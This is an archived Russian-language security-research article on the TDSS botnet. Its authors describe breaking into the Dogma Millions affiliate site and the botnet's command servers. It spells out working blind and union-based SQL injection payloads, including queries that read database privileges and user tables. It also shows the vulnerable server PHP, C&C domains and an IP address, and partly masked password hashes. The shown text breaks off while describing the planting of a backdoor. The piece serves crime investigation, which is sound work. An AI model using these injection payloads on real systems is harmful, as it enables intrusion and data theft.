<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/ga.js"></script><script src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app216.us.archive.org';v.server_ms=386;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://nobunkum.ru:80/ru/tdss-botnet","20180310124741","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1520686061");
</script>
<link rel="stylesheet" type="text/css" href="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>TDSS: полное раскрытие</title>
  <!-- base href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180310124741/http://nobunkum.ru:80/ru/tdss-botnet</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://nobunkum.ru/ru/tdss-botnet","20180310124741",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li class="current"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <div style="margin-top: -30px;">
﻿<h1>TDSS: полное раскрытие</h1>
<p class="author">Андрей Рассохин<br>специалист по информационной безопасности, Esage Lab<br><a href="https://web.archive.org/web/20180310124741/mailto:andrey@esagelab.com">andrey@esagelab.com</a></p>

<p class="author">Дмитрий Олексюк<br>системный архитектор, Esage Lab<br><a href="https://web.archive.org/web/20180310124741/mailto:dmitry@esagelab.com">dmitry@esagelab.com</a></p>

<ul class="toc">
  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s1">Часть 1. Вскрытие</a>
	<ul>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s2">Партнёрская программа</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s3">Командные сервера</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s4">База данных</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s5">Скрипты</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s6">«Чёрный ход»</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s7">Повышение привилегий</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s8">Панель управления</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s9">Смена серверов</a></li>
	</ul>
  </li>

  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s10">Часть 2. Анализ</a>
	<ul>

<div class="aside">
<p></p><h4>Статья также доступна на <a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/analytics/en-tdss-botnet">английском</a> языке</h4><p></p>
</div>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s11">База данных и скрипты</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s12">Запросы от ботов к серверу</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s13">Учётные записи партнёров</a></li>

<div class="aside">
<h3>Dear English-speaking readers!</h3> Part one of the current article has been published in the Hakin9 magazine, <a href="https://web.archive.org/web/20180310124741/http://docs.google.com/viewer?url=http://hakin9.org/system/articles/attachment1s/12928/original/Spyware_Hakin9_10_2010.pdf">Issue 10/2010, page 18</a>
</div>

	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s14">Таблица ботов</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s15">Система команд</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s16">Модули «полезной нагрузки»</a></li>
	  <li><a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-botnet#s17">Статистика</a></li>
	</ul>
  </li>
</ul>

<p>Бот-руткит TDSS на сегодняшний день хорошо изучен. Однако ни одно из 
исследований не идёт дальше анализа кода вредоносной программы и 
источников её распространения. Данная статья призвана восполнить этот 
пробел, осветив скрытые механизмы ботнета и его объективные 
характеристики.</p>

<div class="aside">
<p>Алиса Шевченко. <a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/tdss-analysis">Анализ руткита TDSS</a>.</p>
</div>

<p>Кроме того, при публикации этого материала мы преследовали еще одну 
цель: представить методологию расследования компьютерных преступлений. 
Данное исследование демонстрирует, как, имея на руках только инструмент 
злоумышленников (бинарный файл трояна), выйти на «цифровое ядро» 
киберформирования и проанализировать его. Следует заметить, что 
применяемый подход позволяет извлечь всю техническую информацию об 
инциденте, в то время как задача установления личностей атакующих и 
привлечения их к ответственности остаётся в сфере компетенции 
правоохранительных органов.</p>

<div class="aside"><p><strong>Партнёрская программа, «партнёрка»</strong>
 — веб-сервис по привлечению широкого круга веб-мастеров к 
распространению некоторого продукта за вознаграждение, обычно в виде 
доли от стоимости продукта.</p></div>

<h2 id="s1">Часть 1. Вскрытие</h2>

<p>В последнее время в интернете возрождается популярность <em>партнерских программ</em>.
 Всё больше и больше крупных ботнетов, результаты исследования которых 
публикуются в русскоязычных и зарубежных источниках, оказываются связаны
 с той или иной партнёрской программой. Ботнет TDSS — возможно, самый 
крупный на сегодняшний день — не является исключением. Распространение 
вредоносной программы, обеспечивающей функционирование данного ботнета, 
осуществляется партнёрской программой «Dogma Millions».</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/1.jpg" width="800" height="498" alt="Главная страница партнёрской программы dogmamillions.com"><p>Главная страница партнёрской программы dogmamillions.com</p></div>

<p>На сайте <code>dogmamillions.com</code> описаны правила работы с 
партнёрской программой и условия для партнёров. После регистрации 
партнёру доступен для загрузки бинарный файл руткита TDSS, подлежащий 
распространению любыми удобными способами за комиссионное 
вознаграждение.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/2.jpg" width="800" height="447" alt="Личный кабинет партнера на сайте партнерской программы"><p>Личный кабинет партнера на сайте партнерской программы</p></div>

<div class="aside"><p><strong>Целевая страница</strong> или <strong>«лендинг»</strong>
 (от английского «landing page») — веб-страница, на которую пользователь
 попадает в результате перехода по рекламной ссылке или направляется 
другими способами (например, путём открытия всплывающих окон).</p></div>

<p>Партнёрам предоставляется удобная статистика по заражённым с их 
помощью компьютерам и количество заработанных комиссионных, а также 
ссылки на целевые страницы для заражения посетителей, на которые можно 
направлять поисковой трафик различных тематик.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/3.jpg" width="800" height="447" alt="Дополнительная учётная запись со ссылкой на загрузку исполняемого файла TDSS"><p>Дополнительная учётная запись со ссылкой на загрузку исполняемого файла TDSS</p></div>

<h3 id="s2">Партнёрская программа</h3>

<div class="aside"><p><strong>SQL injection</strong> — метод атаки на 
веб-сайт, который заключается во внедрении запросов SQL в легитимные 
данные, получаемые веб-сервером от посетителя сайта, и считывании 
полноценных ответов на запросы от СУБД.</p><p><strong>Blind SQL injection</strong>
 — атака идентична SQL Injection за тем исключением, что атакующий 
вынужден действовать вслепую, методом прощупывания базы данных при 
помощи отдельных SQL-запросов, результат выполнения которых должен быть 
сведён к бинарному формату типа «истина/ложь».</p></div>

<p>На сервере партнёрской программы использовалась база данных MySQL 
версии 5. Все запросы к базе данных, описанные далее, будут 
соответствовать языку запросов MySQL.</p>

<p>Поиск уязвимостей в скриптах личного кабинета не принёс результата. 
Однако получить доступ к базе данных всё-таки удалось: вначале при 
помощи атаки <em>Blind SQL injection</em>, а затем и классической атаки <em>SQL injection</em>.</p>

<p>Для партнёров существует возможность создания дополнительных учетных 
записей (subaccounts). Последние используются для анализа эффективности 
использования разных видов веб-трафика с разными целевыми страницы. 
Например, одной дополнительной учетной записи может соответствовать 
троян, на загрузку которого будет направляться порно-трафик. Таким 
образом, данный троян скачает жертва, просматривающая сайты с 
порнографическим содержимым. К другой может быть привязан троян, 
загружаемый посетителями сайтов с «крэками». В результате раздельного 
сбора статистики партнёр может оценить, какой вид трафика лучше подходит
 для работы с данной партнёрской программой, принося максимум 
комиссионных.</p>

<p>Дополнительные учётные записи создаются при помощи HTTP-запроса типа GET:</p>

<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;create=1</pre>

<p>После такого запроса в личном кабинете партнёра появится 
дополнительная учётная запись с идентификатором 1. Её можно удалить, 
указав её идентификатор в соответствующем GET-запросе:</p>

<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=1</pre>

<p>Атака Blind SQL Injection заключалась в следующем. Необходимо было 
создать дополнительную учётную запись с любым произвольным 
идентификатором и затем попытаться его удалить. Параметр запроса delete 
был уязвим, поэтому возможно было провести атаку, отправив на сервер 
запрос следующего вида:</p>

<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=if(ord(substring((version()),1,1))&gt;1,1,0xffff)</pre>

<p>Если значение выражения <code>ord(substring((version()),1,1))</code> больше 1, то условие <code>if</code> возвращает 1, и запрос упрощенно принимает следующий вид:

</p><pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=1</pre>

<p>Если же условие ложно, то запрос будет иметь вид:</p>

<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;delete=0xffff</pre>

<p>Таким образом, дополнительная учетная запись будет удалена только в том случае, если переданное в параметре <code>delete</code> условие истинно. На основе этих данных может быть проведена атака Blind SQL Injection.</p>

<p>Возможен и другой вариант атаки. Параметр <code>create</code> команды
 создания дополнительной учётной записи также уязвим. Запрос следующего 
вида приведет к созданию на сервере дополнительной учетной записи с 
идентификатором, равным значению выражения:</p>

<pre class="oneliner">http://dogmamillions.com/index.php?request=members.sab_account&amp;create=ord(substring((version()),1,1))</pre>

<p>Таким образом, если версия базы данных на сервере выше 5, то первым 
символом строки, которую вернёт команда version(), будет «5». ASCII-код 
этого символа равен 53, поэтому в личном кабинете партнера появится 
дополнительная учётная запись с идентификатором 53.</p>

<div class="figure">
<pre>affiliates
	affId
	affAid
	affLogin
	affPassword
	affGroup
	affBalance
	affBalanceEarnings
	affBalancePayout
	affBalanceRefferal
	affBalanceCPV
	affBalanceBonus
	affBalancePenalty
affiliatesaccounts
	affId
	affSid
bonuses
countries
cpvearnings
cronUpdateStatFeeds
	cronId
	cronCreated
	cronStart
	cronCompleted
	cronDateFrom
	cronDateTo
	cronStatus
crontime
domains
	id
	domain
	status
	category
groups
invites
managers
news
payments
paymentsfields
paymentsperiods
paymentsproperties
paymentstypes
penalties
statisticsearnings
statisticsinstalls
statisticsrefferals
substatearnings</pre>
<p>Часть таблиц с колонками из базы данных <code>dogmamillions.com</code></p></div>

<div class="figure"><pre>1:Ro<span class="censored">**</span>:c94405aee9b728bad<span class="censored">************</span>b1f
3:over<span class="censored">****</span>:5f4dcc3b5aa765d61<span class="censored">************</span>f99</pre><p>Первые дополнительные учетные записи из таблицы <code>affiliates</code> базы данных <code>dogmamillions.com</code></p></div>

<div>На основе вышеописанных уязвимостей были разработаны эксплойты, с 
помощью которых был произведен анализ базы данных сервера партнёрской 
программы.</div>

<h3 id="s3">Командные сервера</h3>

<p>На момент проведения анализа командные сервера (C&amp;C, 
command-and-control) ботнета TDSS располагались по следующим доменным 
именам и IP-адресам (фрагмент файла конфигурации руткита):</p>

<pre>[tdlcmd]
servers=https://d45648675.cn/;https://d92378523.cn/;https://91.212.226.62/
wspservers=http://b11335599.cn/;http://b00882244.cn/
popupservers=http://m3131313.cn/</pre>

<p>Управление ботнетом производится с трёх серверов, указанных в поле <code>servers</code> файла конфигурации. Именно их мы проверили на предмет уязвимостей в первую очередь.</p>

<p>В результате анализа бинарного файла бота было установлено, что 
отправка данных на сервера осуществляется по следующему алгоритму:</p>

<ol>
  <li>формируется пакет данных;</li>
  <li>этот пакет шифруется по алгоритму RC4, причём в качестве ключа используется IP-адрес либо доменное имя целевого сервера;</li>
  <li>пакет данных дополнительно кодируется по алгоритму Base64;</li>
  <li>данные отправляются на сервер.</li>

</ol>

<p>Таким образом, пседвокод алгоритмов шифровки и дешифровки выглядит следующим образом:</p>

<pre>сhar *encoded_data = base64_encode(rc4_encrypt(data, key));
сhar *decoded_data = rc4_decrypt(base64_decode(data), key);</pre>

<p>Анализ данных, передаваемых ботом на сервер, выявил уязвимости, 
позволяющие произвести атаки Blind SQL injection и SQL Injection.</p>

<p>В частности, в результате неправильного GET-запроса сервер возвращал 
сообщение об ошибке, в тексте которого содержалась закодированная строка
 и полный путь к уязвимому скрипту на сервере.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/6.jpg" width="800" height="99" alt="Сообщение об ошибке при неправильном запросе к серверу"><p>Сообщение об ошибке при неправильном запросе к серверу</p></div>

<p>После расшифровки строки по описанному выше алгоритму была получена команда следующего вида:</p>

<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|10000|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|%SYSDIR%\qo.dll|success</pre>

<p>Точное назначение этой команды на этапе атаки было неясным. Однако в 
результате её анализа было установлено, что третий параметр в списке, 
разделенном символом вертикальной черты, является уязвимым.</p>

<p>Первый вариант эксплойта, предназначенного для чтения данных из базы,
 был разработан с использованием метода задержки. Запрос для атаки 
выглядел следующим образом:</p>

<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((version()),1,1))&gt;1,sleep(3),1)</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>

<p>В основу этого эксплойта положена команда, при успешном выполнении 
которой ответ от базы данных придет с задержкой на 3 секунды, тогда как 
при невыполнении задержки не произойдет. Это стандартный вариант 
реализации атаки Blind SQL injection с задержкой с тем исключением, что 
вместо функции <code>benchmark()</code> использована функция <code>sleep()</code>, так как последняя не создает нагрузки на СУБД.</p>

<h3 id="s4">База данных</h3>

<p>Приступив к атаке, мы первым делом проверили, имеет ли текущий пользователь привилегию на чтение и запись данных на сервере (<code>File_priv</code>). Запрос, отправленный на сервер для этой цели, до шифрования выглядел следующим образом:</p>

<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((SELECT File_priv FROM mysql.user WHERE (CONCAT_WS(CHAR(64),User,Host) LIKE USER())),1,1))&gt;1,sleep(3),1)</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/7.jpg" width="677" height="124" alt="Результат работы эксплойта для Blind SQL Injection с задержкой"><p>Результат работы эксплойта для Blind SQL Injection с задержкой</p></div>

<p>В результате успешной эксплуатации стало ясно, что существует 
возможность чтения и записи для определенных файлов на сервере. Но, 
поскольку читать файлы при помощи этого эксплойта было бы слишком 
медленным, запрос к базе данных был переделан следующим образом:</p>

<pre class="oneliner">remover|42F831D92B3BE5076B635F2347C80A41|<strong>if(ord(substring((version()),1,1))&gt;1,1,(select 1 union select 2))</strong>|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|SYSDIR\qo.dll|success</pre>

<p>При истинном значении условия новая команда вместо задержки возвращает ошибку, а при ложном — завершается успешно.</p>

<p>После считывания и изучения базы данных мы переключились на чтение файлов через уязвимость.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/8.jpg" width="676" height="450" alt="Работа эксплойта без задержки"><p>Работа эксплойта без задержки</p></div>

<h3 id="s5">Скрипты</h3>

<p>В результате анализа кода файла <code>index.php</code> и подключаемых
 им скриптов была найдена ещё одна уязвимость, которая существенно 
облегчала исследование благодаря возможности сведения атаки типа Blind 
SQL Injection к классической атаке SQL Injection. Рассмотрим код файлов <code>index.php</code> и <code>modules.php</code>:</p>

<div class="figure">
<pre>&lt;?php
try {

...   

    //$_SERVER["REQUEST_URI"]
    $request      = rc4Decrypt( $_SERVER["HTTP_HOST"], base64_decode( substr( $_SERVER["REQUEST_URI"], 1 ) ) ); 
    $requestCount = 0;
    $requestHost = $_SERVER["HTTP_HOST"];

    if( $request ) {
        $request      = explode( '|', $request );
        $requestCount = sizeof( $request );
    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

...

    } elseif( $request[0] == 'module' ) {
        DBase::connect( DBASE_HOST , DBASE_USER , DBASE_PWD , DBASE_BASE );

         
        include( 'modules.php' );
        
        DBase::disconnect();
    } 

...

    } else {
        var_dump($request);
        var_dump( base64_encode( rc4Encrypt($_SERVER["HTTP_HOST"], 'remover|42F831D92B3BE5076B635F2347C80A41|10000|0|DDA|Trojan.Agent|C:\WINDOWS\system32\qo.dll|%SYSDIR%\qo.dll|success') ) );
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
    


} catch( Exception $e ) {
    print $e;
}</pre>
<p>Часть скрипта <code>index.php</code> (многоточиями замещён опущенный код)</p>
</div>

<div class="figure">
<pre>&lt;?php
require_once( DIR_LIBRARY_MODELS . DS . 'mModules.php' );

    if( preg_match( "%(\d*)!(.*)!%Uis", $request[1], $matches ) ) {
        $modId    = $matches[1];
        $modCrypt = $matches[2];
    } else {
        $modId    = <strong>$request[1]</strong>;
        $modCrypt = FALSE;
    }

    $modDetails = mModules::details( $modId );

    if( $modCrypt ) {
        print rc4Encrypt( $modCrypt, $modDetails['modData'] );
    } else {
        print $modDetails['modData'];
    }
    
    mModules::increment( $modId );</pre>
<p>Уязвимый параметр в скрипте <code>modules.php</code></p>

</div>

<p>Как видно из последнего листинга, значение параметра <code>$request[1]</code>
 не проверяется перед использованием в коде скрипта. Для данной 
уязвимости был разработан эксплойт, позволявший выполнять чтение файлов и
 базы данных в 10 раз быстрее, чем предыдущий:</p>

<pre>module|-1 union select 0,1,count(*),3 from users</pre>

<p>Данный запрос возвращает количество записей в таблице <code>users</code> в тексте сообщения об ошибке, возвращенном сервером.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/11.jpg" width="800" height="111" alt="Проверка эксплойта SQL Injection и ответ сервера на запрос"><p>Проверка эксплойта SQL Injection и ответ сервера на запрос</p></div>

<p>Таким образом, была получена возможность использовать атаку типа SQL 
Injection, что существенно упростило и ускорило изучение сервера.</p>

<p>Следующей задачей было создание файла со скриптом, при помощи 
которого можно было бы выполнять команды к серверу напрямую, не 
используя атаку на MySQL.</p>

<h3 id="s6">«Чёрный ход»</h3>

<p>На этапе внедрения скрипта для удалённого управления сервером 
возникло затруднение: а именно, все GET-запросы к серверу 
перенаправлялись на файл <code>index.php</code>. Таким образом, успешно 
разместив на сервере скрипт «чёрного хода», мы не могли к нему 
обратиться. Обойти это ограничение можно было путем модификации файла 
конфигурации веб-сервера.</p>

<p>Для поиска файла конфигурации был произведен опрос различных 
возможных путей к нему через уязвимость SQL Injection. В качестве 
инструмента для тестирования вариантов пути к файлу использовалась 
программа с открытым кодом wfuzz, слегка модифицированная для 
обеспечения шифровки данных перед их отправкой на сервер. В результате 
тестирования был найден файл конфигурации веб-сервера: <code>/etc/lighttpd/lighttpd.conf</code>.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/12.jpg" width="553" height="537" alt="Содержимое файла lighttpd.conf"><p>Содержимое файла <code>lighttpd.conf</code></p></div>

<p>Листинг файла конфигурации дает представление о том, что перенаправление запросов на <code>index.php</code> происходило с помощью модуля <code>mod_rewrite</code>,
 а настройки для виртуальных серверов подключались в отдельном скрипте 
на языке Perl. В указанном скрипте, в свою очередь, подключались файлы 
конфигурации с настройками для отдельных виртуальных серверов, имена 
которых получались путем перечисления файлов в заданной директории. 
